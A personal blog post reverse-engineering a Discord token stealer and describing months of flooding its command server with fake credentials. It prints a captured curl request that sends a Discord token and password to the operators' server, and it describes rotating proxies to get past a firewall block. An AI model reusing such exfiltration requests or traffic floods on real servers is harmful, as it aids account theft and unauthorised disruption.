---
layout: post
title: Spamming some Discord Skids
description: I spammed some losers that tried to scam me.
date: 2022-08-01
---

Hey, so these are some notes I took about reverse engineering some malware that's been sent to me via
discord, and what I've been doing about it

**These are hardly edited**, but contain useful details which I hope will aid in being able to stop them
Thankfully antivirus is able to flag these files, but I'd love to see this coordinated effort taken down

I'm planning on sharing this with cloudflare as well to see if we can stop them from hosting this CDN. **edit: neither cloudflare or discord responded to me lol**

# Attack of the dutch furries

Someone tried to hack me on discord and so I hacked them right back. here is a brief retelling of what happened

## Why

I have this badge on my account which apparently is valuable for scammers. I assume they want
it so that they can phish people

![](/images/discord-skids/2022-08-14-15-08-13.png)

in the past i have been offered money for my account because of this badge, and later on
I'll find that these badges are a clear target for the scammers

![](/images/discord-skids/2022-08-14-16-17-28.png)

user id 866762355232210984

## previous experience

![](/images/discord-skids/2022-08-14-15-09-56.png)

i've got someone try to scam me before, I only ran strings on it and didn't figure out how it
worked at the time


## The bait

someone messaged me out of the blue asking if I wanted to play their game, i love games!

this is because I have the discord "early verified bot dev" badge, which makes me a
target for future phishing attempts

TODO censor this url if I ever make this more public (**edit the url is down lol get rekt**)
![](/images/discord-skids/2022-08-12-23-12-19.png)

~~unlike before this website just hosts a rar file which is hosted on discord CDN~~

edit; in the time since, they have actually migrated the rar file to be hosted
on their own web server, good for them

![](/images/discord-skids/2022-08-12-23-14-10.png)

of course I have to be as annoying as possible. these are scum of the earth, this is
a free therapy session to vent my frustrations of the world

![](/images/discord-skids/2022-08-12-23-14-54.png)

I used a bait account which was not my verified bot dev account, and quickly deleted it after

they were not happy that I baited them, since they could tell which user I had used

haha

(when going back to write this afterwards, the original owner of this account (it had been taken over) came back and renamed it to something else, this is why the username is different. same person.)

![](/images/discord-skids/2022-08-12-23-16-32.png)

also why do they insist I download winrar

![](/images/discord-skids/2022-08-12-23-17-13.png)

anyways they gave up. whatever, I have what I need

## hacking_sounds.wav

cool so now i have the payload, what does it do?

thankfully I can just spin up azure VMs and go wild, unfortunately unlike
a previous attempt I can no longer seem to spin up windows 8 VMs, which
absolutely seemed to break the node.js runtime thingy they are using

admittedly there's some interesting stuff going on in the application that I have glossed over and will need to visit

The first thing I noticed is that the script will open in a command window, then disappear, and some stuff happens

![](/images/discord-skids/2022-08-12-23-19-09.png)

it writes this file , runs it, and then deletes it.

but, if I copy the .exe to a directory which doesn't have permissions to run the file, then it cannot delete it, and so I can keep the file and look at it

unfortunately not very interesting, it just hides the conhost window

![](/images/discord-skids/2022-08-12-23-20-16.png)

procmon is pretty cool shit, I was able to log what the process was doing. in addition to writing this powershell script to hide the window I also saw it writing out libraries, accessing directories to check for browser cookies (need to dive further into this), but also saw it going into the discord app data directory

seems like discord was the primary target, as that's the way that the scammers can hop accounts, but while they are at it they are stealing browser cookies and whatever else they can find. still haven't ruled out exactly what else they are doing here, or how they are doing it, again this is a gap in my coverage of this so far

## javascript acquiredscript

![](/images/discord-skids/2022-08-12-23-23-04.png)

cool so now that I know what it does, I can see that it wrote out to the file 
discord/app/index.js

unsure if it is overwriting or just adding a new file but also modifying the discord app to load it on start up

![](/images/discord-skids/2022-08-12-23-24-27.png)

again, procmon to the rescue, mon

### hey I see wireshark, what were you doing 

so there is an environment var in windows that can log TLS handshake keys so that
wireshark can decrypt tls. unfortunately electron apps like discord do not care about this, and this exploit only targets the discord electron app from what i can tell

however, I was able to see the DNS requests the app was making, and confirm that
it was sending encrypted traffic. There was another method that I used to capture traffic which I will explain in a bit

----

anyways, this javascript is a hot piece of mess

basically it's got a big list of strings which have method names, text fields, segments of urls, etc. and each time it accesses those it calls into a method which basically gets it out of that list

![](/images/discord-skids/2022-08-12-23-27-44.png)

the list of keywords and such

![](/images/discord-skids/2022-08-12-23-27-23.png)

so a lot of the code looks like this

![](/images/discord-skids/2022-08-12-23-29-37.png)

basically all it does is takes the index provided, and returns `index - 444`. that's it

but when i did this the first time, it was really broken:

TODO - i do not have an example of this

basically, there is another trick that they are doing: the list of keywords is not in the correct order at rest, and needs to be modified before it is accessed

thankfully, it's just a simple cipher, and doesn't modify as it is accessed (thank fuck)

![](/images/discord-skids/2022-08-12-23-32-20.png)

This method uses json parseint to fetch 13 values, if they are all valid ints (see rant) and if the computed check value matches the key, stop, because the values are fine.
Otherwise, rotate the contents by one and try again

### rant

why the fuck does parseint accept so many stupid values

```
parseInt('4075e8=_0x') == 4075
```

fuck javascript


anyways here's the gist of the check function (the lookup function is not very interesting)

```python
def try_solve():
    try:
        ans = key_lookup(0x342) / 1 *\
            key_lookup(0x1d0) / 2 +\
            key_lookup(0x3c6) / 3 *\
            key_lookup(0x37f) / 4 +\
            - key_lookup(0x1db) / 5 *\
            key_lookup(0x1f5) / 6 +\
            - key_lookup(0x303) / 7 +\
            key_lookup(0x332) / 8 *\
            - key_lookup(0x282) / 9 +\
            - key_lookup(0x29f) / 10 *\
            - key_lookup(0x2cf) / 11 +\
            - key_lookup(0x42f) / 12 *\
            - key_lookup(0x2df) / 13
        # print('HEY I HAVE SOMETHING', ans)
        return ans == 711825
    except Exception as e:
        # print(e)
        return False

def rotate(l):

    start_len = len(l)
    # rotate left
    f = l[0]
    l = l[1:]
    l.append(f)

    end_len = len(l)

    assert start_len == end_len
    return l
```


---

The number of times I had to rotate was about 400 something

![](/images/discord-skids/2022-08-12-23-33-32.png)

Once rotated, the string replacement of the words in the string list started to make sense. There's still a little bit of obfustication going on, like strings of js
that are evaluated at runtime, or lookups into weird lists for some reason, but it's actually readable now and I'm able to figure out what's what

## so what does it do

a few things stuck out to me:

![](/images/discord-skids/2022-08-12-23-38-02.png)

check out these urls, they are interested in user billing info, friends, 2fa, etc. very invasive.

![](/images/discord-skids/2022-08-12-23-39-05.png)

they take this data, and build a json object and send it to their server (and the fields are scary, they have plaintext passwords and tokens, and can monitor when they change)

**takeaway: change your password OUTSIDE of the app using emailed code**

![](/images/discord-skids/2022-08-12-23-40-33.png)

this seems to inject itself in the discord startup, so it only goes away if the discord updater decides to overwrite the file?? scary

![](/images/discord-skids/2022-08-12-23-41-30.png)

it has the user token, and so it can look up extra user data like friends and billing info (yikes)

and I think this is how it is able to hook requests that the client makes on startup/login/changed password

![](/images/discord-skids/2022-08-12-23-43-12.png)

yikes

## phuck the phishers

these guys can eat shit, so i wanted to do something

while I have most of the payload, and can tell where the traffic was going via wireshark dns logs,
i couldn't really tell too easily what was happening

and so there is a setting you can manually enable in the settings.json of the discord client to enable the electron dev console (opt in because users kept screwing themselves)

![](/images/discord-skids/2022-08-12-23-43-42.png)

and once this is open I can see all of the requests being made

interestingly, they have a message waiting for me in the 200 OK response body

but here I could copy (as a curl method) the request being made

```
  curl 'https://t4ckXXXXXXXXXXXXXct.nl/J6d0IxhsyBHf' \
  -H 'authority: t4ckXXXXXXXXXXXXXct.nl' \
  -H 'access-control-allow-origin: *' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9005 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36' \
  -H 'content-type: application/json' \
  -H 'accept: */*' \
  -H 'origin: https://discord.com' \
  -H 'sec-fetch-site: cross-site' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://discord.com/' \
  -H 'accept-language: en-US' \
  --data-raw '{"data":{"username":"undefined#undefined","password":"adsflafdlkjfukckafukcjsadkfukclnasdflkalskdflkafdlkasflkj"},"billing":{"message":"401: Unauthorized","code":0},"friends":{"message":"401: Unauthorized","code":0},"token":"MTAwNTYwNTQzNTkyMDg3NTY1Mg.GlbYTA.vkjxrC1uAw6e1ZeuumledpaUBWSituhexgaKGU","type":"login"}' \
  --compressed
```

great, I have the method, the endpoint, the contents, everything I need to duplicate this attack

## wouldn't it be great if I could generate fake user data to send their way?

that's what I thought, so I did

```py
def get_user_id(user_age: datetime.datetime):
    # https://discord.com/developers/docs/reference#convert-snowflake-to-datetime
    user_id = 0

    # timestamp milliseconds
    timestamp = int(user_age.timestamp()) * 1000
    timestamp -= 1420070400000
    user_id = timestamp << 22

    # internal worker id 5 bits
    worker = random.randint(1, 31)
    process = random.randint(1, 31)
    increment = random.randint(1, 4095)

    user_id |= worker << 17
    user_id |= process << 12
    user_id |= increment

    return user_id

def get_user_token(user_id, token_time: datetime.datetime):
    # A discord token is comprised of 3 segments-
    # the first segment is the base64 encoded user id as a string
    user_id_bytes = str(user_id).encode('utf-8')
    user_id_encoded = base64.b64encode(user_id_bytes).decode('utf-8')
    user_id_encoded = user_id_encoded.rstrip('=')

    # the second segment is the timestamp when the token was generated
    timestamp = int(datetime.datetime.utcnow().timestamp())
    timestamp -= 1218000000 # seems they have modified this, this timestamp
    # is close enough to be realistic
    # encode 32 bit int into base64
    timestamp_bytes = timestamp.to_bytes(8, byteorder='big')
    timestamp_encoded = base64.b64encode(timestamp_bytes).decode('utf-8')
    timestamp_encoded = timestamp_encoded.rstrip('=')

    # last segment is an hmac which is basically 28 random bits
    key = [random.randint(0, 255) for _ in range(28)]
    key = bytearray(key)
    key_encoded = base64.b64encode(key).decode('utf-8').rstrip('=')
```

using the top 10k passwords list and some messing around, I now have what I need to generate fake user data that checks out (is "valid", just not for a real user)

and so hopefully this should waste their time

![](/images/discord-skids/2022-08-12-23-49-20.png)

and so I created a function app that generates these payloads using fake user data, once a minute, scheduled for a random time in the next week

![](/images/discord-skids/2022-08-12-23-51-41.png)

anyways so now it posts this fake data to them a bunch to waste their time. if I have the further motivation, i'll also implement the changed password and billing data bits that I haven't done yet

## why dutch furries

![](/images/discord-skids/2022-08-12-23-52-35.png)

so all of the domain names have been `.nl` so far

![](/images/discord-skids/2022-08-12-23-52-54.png)

and their landing page showed this

I found this page when I was GETing the request and not POSTing it

![](/images/discord-skids/2022-08-12-23-53-05.png)

which is a clone of `superfurrycdn.nl`

not sure what this other site is or if it's involved, but they stole the landing page and the favicon

whatever, I am going to assume they are dutch furries

also, fuck these guys


## update 8/13
![](/images/discord-skids/2022-08-13-08-05-46.png)

there is a password on the rar file now

![](/images/discord-skids/2022-08-13-08-06-16.png)

and implemented get change password

```
$ john-the-ripper --format=rar rar.hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (rar, RAR3 [SHA1 256/256 AVX2 8x AES])
Will run 12 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:00:29 12.21% 1/3 (ETA: 08:22:49) 0g/s 164.6p/s 164.6c/s 164.6C/s rarCrazyDown}..csetuppb
0g 0:00:00:33 13.26% 1/3 (ETA: 08:23:00) 0g/s 167.4p/s 167.4c/s 167.4C/s grarr..rcrazydownu
```

thanks john the ripper!


![](/images/discord-skids/2022-08-13-08-27-42.png)
hacking noises intensify

edit: john the ripper was too slow because it did not support GPU, I switched over to GPU brute forcing, since I had no luck using some of my wordlists

I let it run on my laptop for a day, but didn't get very far

![](/images/discord-skids/2022-08-14-15-05-15.png)

## startling online

this was from back in dec 2021, I didn't have the skillz to reverse
it like I do now

![](/images/discord-skids/2022-08-14-15-16-07.png)

this shit doesn't work because I'm not signed in, and they cannot spell!

it's also doing the same thing

![](/images/discord-skids/2022-08-14-15-17-35.png)

writes to that one file (and is also a node js app)

![](/images/discord-skids/2022-08-14-15-21-25.png)

the two js files have a different key (103015 vs 711825), and so they could be different
likely are sending to different hosts

![](/images/discord-skids/2022-08-14-15-23-11.png)

format document, find instances of this lookup function, find and replace

and then run my script against it

![](/images/discord-skids/2022-08-14-15-24-33.png)

853 instances

to get the script ready I did this

```js
var x = [ 'strings list goes here' ]
var o  = []
x.forEach(y => o.push   (parseInt(y)))
copy(o)
// add this to nums_starling
```

![](/images/discord-skids/2022-08-14-15-36-54.png)

cool it works again (I should make a way to automate this)

![](/images/discord-skids/2022-08-14-15-43-34.png)

here's another server they are using

![](/images/discord-skids/2022-08-14-15-44-38.png)

and it's the same server

![](/images/discord-skids/2022-08-14-15-46-43.png)

sweet, time to add it

omg they've been running this since at least dec 2021

![](/images/discord-skids/2022-08-14-15-49-13.png)

so like 8 months

### etc

contents of the package.json file that enables injection of js

```

```

![](/images/discord-skids/2022-08-15-12-55-32.png)

can break the malware if we delete app asar


## Sept 2022

got another sample and the PASSWORD

they have moved to blogspot

![](/images/discord-skids/2022-09-01-23-57-33.png)

PASSWORD IS 5KJ9-34FH-KLS7

FUCK YEA

reversing this malware again, also is a node js app and seems to be doing the same thing

![](/images/discord-skids/2022-09-01-23-58-58.png)

### they changed the path kinda

![](/images/discord-skids/2022-09-02-00-18-02.png)

the path is different, but the same server, so i will start sending requests to both

**BUT SO WILL I**, randomly will choose
between the two paths to avoid suspicion

### now I know the format of the password

4 digits, 3 groups, uppercase

going to write a generator, and then pipe this into hashcat or something

ezpz

seems like the rest of the thing is all the same, so I'm not going to worry about it

![](/images/discord-skids/2022-09-02-00-50-25.png)

hippity hoppity give me your password

## note about encryption

interesting difference about the sample 3 mozi
and sample 2 startling online

mozi lets you view the contents of the rar without decrypting, the password is required to decrypt

startling online setupp requires the password to even list the files

interesting, not sure if this affects things.

# i am stupid

![](/images/discord-skids/2022-09-02-01-01-10.png)

forgot to include post body, so I did nothing for a few weeks

fixed it now

## blcoked by firewall

![](/images/discord-skids/2022-09-02-17-10-28.png)

getting blocked by firewall, need to change ip since it seems it is blocking all azure traffic

## notes

https://www.joesandbox.com/analysis/677245/0/html

interesting notes about another sample

## more samples

![](/images/discord-skids/2022-09-06-21-34-59.png)

https://github.com/Stanley-GF/PirateStealer

oh so this is the source

https://get-findthehidden.ml/

another one

https://github.com/HenryFBP/mystery-files/tree/master/viruses/Blast%20Dudes

really good notes from this guy, very similar

![](/images/discord-skids/2022-09-06-21-54-34.png)

this is flagged and is actually preventing me from opening in windows

modified date is really recent 

![](/images/discord-skids/2022-09-06-22-00-26.png)

this seems to be using the premium malware

![](/images/discord-skids/2022-09-06-22-08-23.png)

![](/images/discord-skids/2022-09-06-22-09-10.png)

and just sends the user db

https://github.com/worstheaven/SuperFurryCDN

I am late to the party

https://github.com/topics/bbystealer

I am late to this party

# 4 months later

So I got busy and never finished this. I've let this run for a while, let's see how it's going:

![](screenshot%20of%20app%20insights%20showing%20success%20code%20of%20response.png)

I let this run for 4 months, it kinda kept working. I didn't put any attention into monitoring uptime, I've
been too busy with other things.

There is a gap in this graph around Jan 15. Not sure what happened, must have got unlucky with the selection of
free http proxies that I chose from. Whatever.

Also, the cost of the function app is like $2 a month. Not sure why it isn't covered by the free base cost of invocations, doesn't really matter. This is what free monthly credits are for :sunglasses:

## Next step, wonder how hard it would be to brute force possible c2 addresses

I know the format that they use on the c2, wonder if they have moved on to a new url.

# update 3/29/2023

got busy.

seems that around 2/15 2023 this broke, did the move to a new website?

![](/images/discord-skids/2023-03-29-22-46-34.png)

seems that their c2 server is down

![](/images/discord-skids/2023-03-29-22-48-45.png)

Mission Accomplished?

this other c2 which seems to have been hosted on the same server is also down (different domain)

![](/images/discord-skids/2023-03-29-22-54-18.png)

so seems like I can shut this project off now

holy fucking bingle